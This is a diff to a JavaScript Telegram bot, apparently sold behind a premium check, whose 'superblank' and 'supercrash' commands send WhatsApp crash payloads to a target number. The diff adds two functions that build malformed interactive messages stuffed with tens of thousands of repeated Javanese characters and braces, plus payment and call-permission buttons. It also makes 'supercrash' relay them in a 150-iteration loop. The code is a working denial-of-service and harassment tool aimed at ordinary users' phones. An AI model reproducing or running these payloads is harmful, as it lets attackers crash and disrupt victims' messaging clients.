@@ -41,7 +41,7 @@ const usePairingCode = true;
 const blacklist = ["isi_bebas"];
 ///////// RANDOM IMAGE JIR \\\\\\\
 const randomImages = [
-  "https://files.catbox.moe/jx7vzx.jpg"
+  "https://files.catbox.moe/juf5kb.jpg"
 ];
 
 const getRandomImage = () =>
@@ -667,8 +667,9 @@ bot.command("superblank", checkWhatsAppConnection, checkPremium, async (ctx) => 
   }
 
   for (let i = 0; i < 1; i++) {
-    await DelayHard(45,target);
+    await CallUi(target)
     await sleep(15000);
+    await cccxccccxx(target)
   }
 
   await ctx.telegram.editMessageMedia(
@@ -749,9 +750,10 @@ bot.command("supercrash", checkWhatsAppConnection, checkPremium, async (ctx) => 
     );
   }
 
-  for (let i = 0; i < 1; i++) {
-    await DelayHard(45, target);
-    await sleep(20000);
+  for (let i = 0; i < 150; i++) {
+    await cccxccccxx(target)
+    await sleep(2000);
+    await cccxccccxx(target)
   }
 
   await ctx.telegram.editMessageMedia(
@@ -1336,6 +1338,70 @@ async function protocolbug3(target, mention) {
     }
 }
 
+async function CallUi(target) {
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            contextInfo: {
+              expiration: 1,
+              ephemeralSettingTimestamp: 1,
+              entryPointConversionSource: "WhatsApp.com",
+              entryPointConversionApp: "WhatsApp",
+              entryPointConversionDelaySeconds: 1,
+              disappearingMode: {
+                initiatorDeviceJid: target,
+                initiator: "INITIATED_BY_OTHER",
+                trigger: "UNKNOWN_GROUPS"
+              },
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 1,
+                  expiryTimestamp: null
+                }
+              },
+              externalAdReply: {
+                showAdAttribution: false,
+                renderLargerThumbnail: true
+              }
+            },
+            body: {
+              text: "satelic" + "ꦾ".repeat(20000),
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(20000),
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson:
+                     "ꦾ".repeat(10000),
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson:
+                     "ꦾ".repeat(10000),
+                }
+              ]
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
+
+  await zaree.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+}
+
+
 async function protocolbug7(target, mention) {
   const floods = 40000;
   const mentioning = "13135550002@s.whatsapp.net";
@@ -1432,6 +1498,39 @@ async function protocolbug7(target, mention) {
       }]
     });
   }
+}
+
+async function cccxccccxx(target) {
+let msg = generateWAMessageFromContent(target, {
+  interactiveMessage: {
+    contextInfo: {
+      isForwarded: true, 
+      forwardingScore: 1972,
+      businessMessageForwardInfo: {
+        businessOwnerJid: "13135550002@s.whatsapp.net"
+      }
+    }, 
+    header: {
+      jpegThumbnail: "7eppImg", 
+      hasMediaAttachment: true, 
+      title: "Satelic Invictus"
+    }, 
+    nativeFlowMessage: {
+      buttons: [
+        {
+          name: "payment_method",
+          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
+        }
+      ],
+      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
+    }, 
+  }
+}, { userJid:target });
+  
+  await zaree.relayMessage(target, msg.message, {
+    participant: { jid:target }, 
+    messageId: msg.key.id
+  }) 
 }
 
 async function protocolbug5(target, mention) {
